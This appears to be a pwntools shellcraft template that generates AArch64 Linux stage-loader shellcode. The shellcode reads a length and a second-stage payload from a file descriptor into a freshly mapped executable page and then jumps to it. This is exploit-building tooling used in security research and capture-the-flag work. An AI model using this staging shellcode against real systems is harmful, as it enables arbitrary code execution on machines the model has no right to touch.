<%
import six
from pwnlib.shellcraft.aarch64 import mov
from pwnlib.shellcraft.aarch64.linux import read, readn, mmap
from pwnlib import constants as C
%>
<%page args="fd=0, length=None"/>
<%docstring>
Migrates shellcode to a new buffer.

Arguments:
    fd(int):
        Integer file descriptor to recv data from.
        Default is stdin (0).
    length(int):
        Optional buffer length.  If None, the first pointer-width
        of data received is the length.

Example:

    >>> p = run_assembly(shellcraft.stage())
    >>> sc = asm(shellcraft.echo("Hello\n", constants.STDOUT_FILENO))
    >>> p.pack(len(sc))
    >>> p.send(sc)
    >>> p.recvline()
    b'Hello\n'
</%docstring>
<%
    protection = C.PROT_READ | C.PROT_WRITE | C.PROT_EXEC
    flags      = C.MAP_ANONYMOUS | C.MAP_PRIVATE

    assert isinstance(fd, six.integer_types)
%>
%if length is None:
    /* How many bytes should we receive? */
    ${read(fd, 'sp', 8)}
    ldr x2, [sp]
%else:
    ${mov('x2', length)}
    str x2, [sp]
%endif

    /* Page-align, assume <4GB */
    lsr x2, x2, #12
    add x2, x2, #1
    lsl x2, x2, #12

    /* Map it */
    ${mmap(0, 'x2', protection, flags, 0, 0)}

    /* Grab the saved size, save the address */
    ldr x4, [sp]

    /* Save the memory address */
    str x0, [sp]

    /* Read in all of the data */
    ${readn(fd, 'x0', 'x4')}

    /* Go to shellcode */
    ldr x30, [sp]
    ret
